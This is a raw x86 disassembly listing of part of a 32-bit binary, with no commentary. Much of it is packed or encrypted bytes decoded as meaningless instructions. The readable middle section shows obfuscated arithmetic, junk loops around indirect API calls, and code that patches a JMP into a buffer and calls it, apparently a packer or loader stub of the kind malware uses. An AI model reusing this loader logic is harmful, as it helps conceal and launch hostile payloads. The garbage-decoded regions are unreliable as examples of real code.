  406fa5:	lea    eax,[edi-0x5]
  406fa8:	xor    cl,ah
  406faa:	ret    
  406fab:	sub    bl,BYTE PTR [ecx-0x2c59715b]
  406fb1:	(bad)  
  406fb3:	scas   eax,DWORD PTR es:[edi]
  406fb4:	fist   DWORD PTR [ebp+0x5f]
  406fb7:	inc    esi
  406fb8:	pop    esi
  406fb9:	pop    ds
  406fba:	or     BYTE PTR [edi],0x87
  406fbd:	out    0x29,al
  406fbf:	pop    es
  406fc0:	enter  0x1ee3,0x9d
  406fc4:	bound  edi,QWORD PTR [ecx+0x60]
  406fc7:	test   DWORD PTR [ebp+0x190badef],ecx
  406fcd:	push   0x9479ffa2
  406fd2:	xchg   bx,ax
  406fd4:	push   eax
  406fd5:	test   DWORD PTR [eax-0x1b],ebp
  406fd8:	xchg   esp,eax
  406fd9:	add    BYTE PTR [ebx-0x65f84f20],bh
  406fdf:	jns    0x406f8b
  406fe1:	sub    eax,0x5032205b
  406fe6:	dec    ebx
  406fe7:	sub    eax,0xa464e755
  406fec:	jb     0x407030
  406fee:	cmc    
  406fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ff0:	and    DWORD PTR [eax+0x30ddc9fe],0xb51fb565
  406ffa:	fdiv   QWORD PTR [esi-0x30]
  406ffd:	lods   eax,DWORD PTR ds:[esi]
  406ffe:	xor    cl,ah
  407000:	outs   dx,DWORD PTR ds:[esi]
  407001:	aaa    
  407002:	ss mov eax,?
  407005:	test   DWORD PTR [ecx-0x33776ffe],eax
  40700b:	pop    ds
  40700c:	or     eax,0x6e9aa342
  407011:	stos   DWORD PTR es:[edi],eax
  407012:	jae    0x407033
  407014:	xchg   edx,eax
  407015:	jae    0x406fc5
  407017:	fnstsw WORD PTR [edx]
  407019:	push   esi
  40701a:	fs sbb edi,eax
  40701d:	adc    BYTE PTR ds:0xb4e44c60,bh
  407023:	xor    ecx,DWORD PTR [eax+0x0]
  407026:	(bad)  
  407027:	enter  0x3917,0xee
  40702b:	push   edx
  40702c:	(bad)  
  40702d:	fsub   QWORD PTR [edi-0x2b]
  407030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407031:	add    cl,BYTE PTR [ebx+edi*2]
  407034:	es inc ecx
  407036:	stc    
  407037:	adc    BYTE PTR [edx],dl
  407039:	punpckhwd mm7,QWORD PTR [ebx+0x7d]
  40703d:	pop    es
  40703e:	and    al,0x42
  407040:	enter  0x617e,0x75
  407044:	and    BYTE PTR [ecx+0x47],ch
  407047:	enter  0x9748,0xc8
  40704b:	mov    al,0x69
  40704d:	(bad)  
  40704e:	adc    BYTE PTR [edx],bh
  407050:	lea    ebx,[ebp+ebx*8-0x12]
  407054:	int    0xe4
  407056:	fucom  st(5)
  407058:	loopne 0x40701c
  40705a:	pop    ebx
  40705b:	ret    0x6498
  40705e:	dec    esp
  40705f:	xchg   esi,eax
  407060:	jp     0x407034
  407062:	imul   edi,DWORD PTR [ecx+ebx*2-0x5b91ea15],0xffffffbd
  40706a:	in     al,0xd
  40706c:	xchg   esi,eax
  40706d:	call   0x79e:0x4b0ed3a1
  407074:	idiv   ebx
  407076:	and    eax,0x4951dd2a
  40707b:	add    ebp,DWORD PTR [edx]
  40707d:	mov    DWORD PTR [eax-0x54],esp
  407080:	idiv   DWORD PTR [esi+edi*8]
  407083:	pusha  
  407084:	pop    ebp
  407085:	out    0xc8,al
  407087:	cld    
  407088:	int    0xb3
  40708a:	sti    
  40708b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40708c:	push   es
  40708d:	ja     0x407069
  40708f:	push   esi
  407090:	and    dl,al
  407092:	adc    BYTE PTR [edx+edi*8-0x34233c6e],0xfe
  40709a:	and    al,0xa
  40709c:	xor    DWORD PTR [eax-0x15],edx
  40709f:	ds (bad) 
  4070a1:	pop    edi
  4070a2:	mov    bh,0xff
  4070a4:	xor    edi,DWORD PTR [edi+0x77]
  4070a7:	popf   
  4070a8:	loope  0x407117
  4070aa:	pop    ebx
  4070ab:	mov    ch,0x16
  4070ad:	mov    edx,DWORD PTR [ecx+esi*2-0x63]
  4070b1:	mov    bl,0xe3
  4070b3:	(bad)  
  4070b4:	arpl   bx,ax
  4070b6:	fsubp  st(7),st
  4070b8:	imul   esp,DWORD PTR [edi-0x395e6706],0xffffffe1
  4070bf:	add    bl,BYTE PTR [eax+0x54]
  4070c2:	jp     0x407055
  4070c4:	cmp    BYTE PTR [ecx-0x5dbc5537],0xf8
  4070cb:	shl    DWORD PTR [ebx-0x3d90e261],cl
  4070d1:	scas   eax,DWORD PTR es:[edi]
  4070d2:	cli    
  4070d3:	mov    esi,0x9429c5e1
  4070d8:	add    ecx,ecx
  4070da:	shl    dl,cl
  4070dc:	arpl   WORD PTR [edx-0x36],bp
  4070df:	sbb    edx,esi
  4070e1:	push   ds
  4070e2:	jle    0x4070a7
  4070e4:	test   al,0x95
  4070e6:	lahf   
  4070e7:	jnp    0x407110
  4070e9:	push   edi
  4070ea:	pop    ebp
  4070eb:	mov    esi,0x2d59c48e
  4070f0:	cmp    ecx,esi
  4070f2:	pop    esp
  4070f3:	xlat   BYTE PTR gs:[ebx]
  4070f5:	sub    al,0x6e
  4070f7:	mov    al,0x72
  4070f9:	inc    esp
  4070fa:	mov    dl,0xa4
  4070fc:	jle    0x4070a8
  4070fe:	fidivr DWORD PTR [esi-0x2f]
  407101:	mov    esi,DWORD PTR [eax+0x56]
  407104:	pop    es
  407105:	test   edi,ecx
  407107:	cmp    al,0xfe
  407109:	inc    ebx
  40710a:	out    0x2a,eax
  40710c:	xlat   BYTE PTR ds:[ebx]
  40710d:	jb     0x40709a
  40710f:	int3   
  407110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407111:	rcr    WORD PTR [eax+0x17655152],1
  407118:	retf   0xd3d1
  40711b:	xor    DWORD PTR [edx],0xc33e56c5
  407121:	(bad)  
  407122:	jmp    0x7393:0x1daab16b
  407129:	and    esp,esi
  40712b:	mov    ebx,0x9dd28488
  407130:	gs sub al,0x10
  407133:	enter  0x9d58,0xfd
  407137:	xchg   esp,eax
  407138:	sub    BYTE PTR [eax-0x441daf41],bh
  40713e:	xor    ecx,DWORD PTR [ecx+0x31da2194]
  407144:	mov    bl,BYTE PTR ds:0x3b264c3f
  40714a:	sbb    ch,BYTE PTR [ecx+0x49]
  40714d:	jge    0x407178
  40714f:	repz push ds
  407151:	rol    DWORD PTR [ecx+eiz*4-0x66387f4d],1
  407158:	or     cl,cl
  40715a:	xor    esp,DWORD PTR [ecx+eiz*2]
  40715d:	push   bp
  40715f:	inc    esi
  407160:	mov    esi,0xe98f0e5d
  407165:	fdivr  st(7),st
  407167:	mov    WORD PTR [edi+0x7f7e6157],?
  40716d:	shr    DWORD PTR [esi+0x485c00d7],1
  407173:	mov    ds,WORD PTR [ebx]
  407175:	adc    ah,ch
  407177:	dec    ebx
  407178:	jnp    0x4071ce
  40717a:	mov    cs,WORD PTR [ebx-0x59]
  40717d:	adc    eax,0xb3e95c3c
  407182:	push   edi
  407183:	dec    ecx
  407184:	pop    edx
  407185:	lds    ecx,FWORD PTR [esi]
  407187:	or     BYTE PTR [eax],dl
  407189:	dec    ebx
  40718a:	or     al,0xa1
  40718c:	or     BYTE PTR [edx+eax*1],dl
  40718f:	xchg   ebp,eax
  407190:	cwde   
  407191:	(bad)  
  407192:	fs test eax,0xedd180d1
  407198:	sbb    al,0x95
  40719a:	sets   ch
  40719d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40719e:	xor    ebx,DWORD PTR [eax+0x63]
  4071a1:	arpl   WORD PTR [edi*4-0x5752ec6e],sp
  4071a8:	test   BYTE PTR [esi],0x8a
  4071ab:	inc    esi
  4071ac:	inc    eax
  4071ad:	xor    al,0x83
  4071af:	mov    al,0x20
  4071b1:	int3   
  4071b2:	sbb    ebx,eax
  4071b4:	pop    esi
  4071b5:	(bad)  
  4071b6:	mov    ecx,0x90ea538c
  4071bb:	push   eax
  4071bc:	or     al,0xc7
  4071be:	sub    al,0x79
  4071c0:	retf   
  4071c1:	inc    ebp
  4071c2:	push   eax
  4071c3:	loop   0x4071d0
  4071c5:	pop    ebp
  4071c6:	imul   esi,esi,0x23c0546c
  4071cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071cd:	sub    dl,BYTE PTR [edi+0x72]
  4071d0:	pop    esi
  4071d1:	aaa    
  4071d2:	mov    eax,0x31283ca9
  4071d7:	push   edx
  4071d8:	jmp    0x407164
  4071da:	fstp   QWORD PTR [edx-0xd754f55]
  4071e0:	mov    cl,0x1
  4071e2:	or     al,0xe8
  4071e4:	out    dx,al
  4071e5:	jae    0x40719c
  4071e7:	pop    edi
  4071e8:	rol    BYTE PTR [ecx],cl
  4071ea:	xchg   esp,eax
  4071eb:	daa    
  4071ec:	loop   0x40718b
  4071ee:	inc    edx
  4071ef:	inc    edx
  4071f0:	pmullw mm3,QWORD PTR [ecx]
  4071f3:	add    eax,0xc8b2ac69
  4071f8:	mov    dl,0x63
  4071fa:	mov    esi,0xdd20b782
  4071ff:	pop    edx
  407200:	jb     0x407258
  407202:	push   ebx
  407203:	retf   0x7fc1
  407206:	rcl    BYTE PTR [ecx+0x52de3d9e],1
  40720c:	or     bl,al
  40720e:	push   eax
  40720f:	nop
  407210:	and    BYTE PTR [ebx+esi*1-0x3f],0xba
  407215:	fnsave [edx+0x32]
  407218:	add    BYTE PTR [ebx],al
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	outs   dx,DWORD PTR ds:[esi]
  407750:	in     al,dx
  407751:	mov    ah,0x6f
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x4077ac
  40775c:	mov    al,0x77
  40775e:	dec    ebx
  40775f:	inc    DWORD PTR [ebp-0x35]
  407762:	inc    esp
  407763:	dec    ebp
  407764:	xor    al,0x68
  407767:	paddq  mm1,QWORD PTR [ebp+0x45c8ef68]
  40776e:	loope  0x4077e2
  407770:	in     eax,0x4b
  407772:	shr    DWORD PTR [esi+0x50a3dbda],cl
  407778:	mov    bl,0x45
  40777a:	xchg   DWORD PTR [edi-0x51],eax
  40777d:	and    eax,ebp
  40777f:	aad    0x3d
  407781:	xchg   DWORD PTR [edi+0x42b82c83],edi
  407787:	cwde   
  407788:	lea    edi,[edi+0x4c]
  40778b:	sar    DWORD PTR [eax],0x48
  40778e:	js     0x407805
  407790:	lahf   
  407791:	pop    edi
  407792:	mov    bl,0xfd
  407794:	or     eax,0x5f307f15
  407799:	add    al,0x6f
  40779b:	(bad)  
  40779c:	(bad)  
  40779d:	fisub  WORD PTR [edi+0x7a]
  4077a0:	mov    ebx,0x76af466
  4077a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077a6:	std    
  4077a7:	fcmovbe st,st(7)
  4077a9:	sti    
  4077aa:	xlat   BYTE PTR ds:[ebx]
  4077ab:	mov    esp,edx
  4077ad:	mov    esp,0x519cb87f
  4077b2:	push   es
  4077b3:	inc    eax
  4077b4:	jnp    0x407759
  4077b6:	sti    
  4077b7:	shl    DWORD PTR [ecx-0x21],0x45
  4077bb:	mov    bh,0xca
  4077bd:	cmp    al,0xfe
  4077bf:	call   0x101:0xf799cb0e
  4077c6:	add    esi,DWORD PTR [ebx+0x21]
  4077c9:	cmp    DWORD PTR [esi+0x4e],esi
  4077cc:	jp     0x407828
  4077ce:	jno    0x4077e2
  4077d0:	or     DWORD PTR [ecx],0xffffffed
  4077d3:	push   esp
  4077d4:	push   0x59
  4077d6:	jmp    0x1027d14c
  4077db:	test   BYTE PTR [ecx],0x9e
  4077de:	xor    DWORD PTR [ecx-0x2de5b7b7],0x74714c69
  4077e8:	stos   BYTE PTR es:[edi],al
  4077e9:	fidiv  DWORD PTR [ecx-0x35]
  4077ec:	inc    ecx
  4077ed:	jl     0x40781a
  4077ef:	dec    ecx
  4077f0:	sub    DWORD PTR [edx-0x49a4b25],0xc1ec3d77
  4077fa:	fwait
  4077fb:	mov    edx,0xe3d37918
  407800:	ror    DWORD PTR [ebx+0x50],1
  407803:	ja     0x4077c5
  407805:	pop    edx
  407806:	or     DWORD PTR [ebp-0xdedc8b2],esp
  40780c:	daa    
  40780d:	fnstsw ax
  40780f:	lahf   
  407810:	jnp    0x40787c
  407812:	lods   al,BYTE PTR ds:[esi]
  407813:	adc    BYTE PTR [edi+0x4287cbff],0xd
  40781a:	es pop eax
  40781c:	pop    es
  40781d:	jle    0x4077a7
  40781f:	dec    ecx
  407820:	in     eax,dx
  407821:	sub    DWORD PTR [ebp+0x36],0xffffffe7
  407825:	mov    dh,0x60
  407827:	icebp  
  407828:	call   0xc6c6:0xa85e9459
  40782f:	ror    bh,1
  407831:	xor    DWORD PTR [ecx+0x3f],0x966dca5c
  407838:	or     esi,DWORD PTR [edi-0x271620da]
  40783e:	jmp    0x407808
  407840:	jo     0x40787f
  407842:	mov    bh,0x1d
  407844:	rcr    ebp,0x99
  407847:	mov    esp,0xd2fffaf3
  40784c:	sub    BYTE PTR [ebx+0x717e19d4],al
  407852:	xchg   BYTE PTR [esp+ebp*1+0x3b],ch
  407856:	mul    BYTE PTR [edx+0x1]
  407859:	adc    al,0x82
  40785b:	f2xm1  
  40785d:	and    al,BYTE PTR [ebp-0x35]
  407860:	adc    cl,BYTE PTR [edx-0x6242fba6]
  407866:	or     eax,eax
  407868:	jmp    0xae3d71f6
  40786d:	jns    0x407853
  40786f:	add    BYTE PTR [edx-0x584e287],ch
  407875:	jg     0x4078bc
  407877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407878:	lods   eax,DWORD PTR ds:[esi]
  407879:	inc    eax
  40787a:	pop    edx
  40787b:	stos   DWORD PTR es:[edi],eax
  40787c:	ins    BYTE PTR es:[edi],dx
  40787d:	inc    edi
  40787e:	add    DWORD PTR [esi+0x2b],edx
  407881:	lds    eax,FWORD PTR [ebp+0x1]
  407884:	sbb    ecx,DWORD PTR [edx]
  407886:	out    dx,al
  407887:	cmc    
  407888:	xchg   ebp,eax
  407889:	call   0xd8ca4fbf
  40788e:	mov    BYTE PTR [eax],bh
  407890:	inc    esp
  407891:	xchg   ebp,eax
  407892:	pop    edx
  407893:	lods   eax,DWORD PTR ds:[esi]
  407894:	sub    al,BYTE PTR [esp+edx*8+0x2]
  407898:	mov    ch,0x90
  40789a:	pop    ebp
  40789b:	retf   0x9e7c
  40789e:	push   edx
  40789f:	sti    
  4078a0:	push   esp
  4078a1:	(bad)
  4078a4:	jne    0x4078d8
